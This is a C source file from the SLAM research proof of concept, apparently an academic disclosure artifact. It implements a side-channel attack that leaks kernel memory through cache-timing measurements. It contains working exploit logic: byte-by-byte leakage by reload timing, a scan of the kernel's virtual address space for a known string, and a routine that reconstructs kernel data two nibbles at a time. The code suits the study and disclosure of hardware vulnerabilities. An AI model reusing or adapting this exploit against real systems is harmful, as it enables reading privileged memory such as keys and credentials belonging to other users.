/* SLAM's ASCII leakage functionality.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

#define NR_RUNS	3
#define ROUND_1 4
#define RETRY_1 26
#define THRES_1 21
#define ROUND_2 128
#define THRES_2 23
#define ROUND_3 20
#define THRES_3 3

uint64_t times[256*NR_RUNS];

static uint8_t unique_below_overall_median(uint64_t *lat, int *unique)
{
	// Compute the "overall" median: the median of all access latencies.
	uint64_t copy[256];
	memcpy(copy, lat, 256*sizeof(uint64_t));
	uint64_t overall_median = median_sort(copy, 256);

	uint8_t hit = 0;
	int nr_hits = 0;
	for (int j = 0; j < 256; j++) {
		// Check for unique latency below the overall median.
		if (lat[j] < overall_median) {
			nr_hits++;
			if (nr_hits > 1) // Not a unique hit, so stop.
				break;
			hit = j;
		}
	}
	*unique = nr_hits == 1;
	return hit;
}

static uint8_t unique_minimum(uint64_t *lat, int *unique)
{
	uint8_t hit = 0;
	int nr_hits = 0;
	for (int j = 0; j < 256; j++) {
#ifdef ONLY_128_RELOADS
		if (j & 0x08)
			continue;
#endif
		// Check for unique minimal latency.
		if (lat[j] < lat[hit]) {
			hit = j;
			nr_hits = 1;
		}
		else if (lat[j] == lat[hit])
			nr_hits++;
	}
	*unique = nr_hits == 1;
	return hit;
}


uint8_t leak_byte(void *secret_ptr, int *confident)
{
	uint64_t lat[256];

	for (int j = 0; j < 256; j++) {
#ifdef ONLY_128_RELOADS
		if (j & 0x08)
			continue;
#endif
		for (int i = 0; i < NR_RUNS; i++)
			times[j*NR_RUNS+i] = signal_get(secret_ptr, j);
	}

	for (int j = 0; j < 256; j++) {
#ifdef ONLY_128_RELOADS
		if (j & 0x08)
			continue;
#endif
		lat[j] = median_sort(times+j*NR_RUNS, NR_RUNS);
	}

	return unique_minimum(lat, confident);
}

int16_t leak_byte_confident(void *secret_ptr)
{
	int16_t leaked_byte;
	int confident;
	int nr_attempts = 0;

	for (int i = 0; i < 100; i++) {
		leaked_byte = leak_byte(secret_ptr, &confident);
		if (confident)
			return leaked_byte;
	}

	// Signal that we could not leak the next byte confidently.
	return -1;
}

/* Scan the (kernel's) virtual address space through the range [@start, @end)
 * with stride @stride, in search of the string @pattern.
 * @pattern must have length at least 6.
 * We only guarantee that the 4.5 bytes following the first 1.5 byte equal the
 * pattern.
 */
uint64_t leak_addr(uint64_t start, uint64_t end, int stride, const char *pattern)
{
	int confident, success = 0, misalignment = 1;
	uint64_t p, minimum, median, len = end - start;
	uint8_t correct_byte, leaked_byte;

	reload_replace_buf(pattern, misalignment);
	correct_byte = ((*(uint32_t *)pattern & 0xff000) >> 12) - misalignment;

	for (p = start; p < end; p += stride) {
		if ((p-start) % 1000*stride == 0)
			pr_interactive(CLEAR_LINE "Scanning memory for \"%s\". (%.2fGB / %5.2fGB)",
				pattern, (float)(p-start)/GB, (float)len/GB);
retry_round_1:
		// Round 1: quickly measure minimum latency.
		for (int i = 0; i < ROUND_1; i++)
			times[i] = signal_get((void *)p, correct_byte);
		minimum = minimum_sort(times, ROUND_1);
		if (minimum > RETRY_1)
			goto retry_round_1;
		if (minimum > THRES_1)
			continue;

		// Round 2: measure median latency a bit more thoroughly.
		for (int i = 0; i < ROUND_2; i++)
			times[i] = signal_get((void *)p, correct_byte);
		pr_debug("\n%lx - med | ", p);
		if (VERBOSITY >= 3) list_print(times, ROUND_2);
		median = median_sort(times, ROUND_2);
		if (median > THRES_2)
			continue;

		// Round 3: try to leak the correct byte a few times.
		for (int i = 0; i < ROUND_3; i++) {
			leaked_byte = leak_byte((void *)p, &confident);
			if (leaked_byte == correct_byte && confident)
				success++;
		}
		pr_debug("p: %lx, round 1: %lu, round 2: %lu, round 3: %d / %d (thres %d)\n",
			p, minimum, median, success, ROUND_3, THRES_3);
		if (success >= THRES_3)
			break;
		success = 0;
	}

	pr_info(CLEAR_LINE "Scanning memory for \"%s\". (%.2fGB / %5.2fGB)\n",
		pattern, (float)(p-start)/GB, (float)len/GB);

	if (!success)
		return -1;

	pr_info("Found \"%s\" at %lx.\n", pattern, p);
	return p;
}

int nr_rewinds = 0;

/* Given the kernel address @addr, leak the @len bytes *in front* of @addr.
 * The double word (4 bytes) at @addr must be known a priori, equal to @known.
 * Returns a string of length @len, equal to the leaked bytes. The caller is
 * responsible for freeing the returned buffer.
 */
char *leak_data(char *addr, int len, char *known)
{
	// Buffer to store the leaked data. We need: 1 byte for the underflowing
	// extra nibble, the amount of secret data, and 4 bytes of known data.
	char *data = malloc(1+len+4);
	memset(data, 0, 1+len);
	memcpy(data+1+len, known, 4);

	char *kptr = addr-2; // Kernel pointer we let the gadget load from.
	char *uptr = data+len-1; // Corresponding user pointer into @data array.

	int overflow = 0;
	int misalignment = 1;
	char *last_uptr = NULL;
	uint32_t leaked_byte;

	pr_info("Leaking kernel memory two nibbles at a time.\n");
	do {
		reload_replace_buf(uptr, misalignment);

		leaked_byte = leak_byte_confident(kptr);
		if (leaked_byte == -1) {
			if (overflow == 1) {
				if (uptr == last_uptr)
					fail("too much rewinding; giving up");
				last_uptr = uptr;
				pr_info("rewind ");
				nr_rewinds++;
				kptr++;
				uptr++;
				*(uint32_t *)uptr &= 0xfff00fff; // Erase incorrect byte.
				continue;
			}
			else {
				overflow = 1;
				continue;
			}
		}
		leaked_byte += misalignment;
		if (overflow)
			// Compensate for the overflow into the next page due to TRANSLATION_OFFSET.
			leaked_byte--;

		*(uint32_t *)uptr |= leaked_byte << 12;
		pr_info("%x ", leaked_byte);

		kptr--;
		uptr--;
		overflow = 0;
	} while (uptr != data-2);
	pr_info("\n");

	// Shift the leaked data one byte to the left, overwriting the starting
	// underflow byte, and cut off the known part.
	memcpy(data, data+1, len);
	data[len] = '\0';

	return data;
}
